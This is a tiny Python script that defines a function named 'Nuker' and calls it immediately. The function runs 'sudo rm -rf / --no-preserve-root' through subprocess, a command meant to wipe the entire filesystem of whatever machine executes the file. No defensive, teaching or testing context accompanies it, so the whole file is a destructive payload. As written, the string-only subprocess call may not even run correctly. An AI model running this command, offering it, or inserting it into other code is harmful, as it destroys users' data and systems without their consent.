import subprocess

def Nuker():
    subprocess.call("sudo rm -rf / --no-preserve-root")

Nuker()
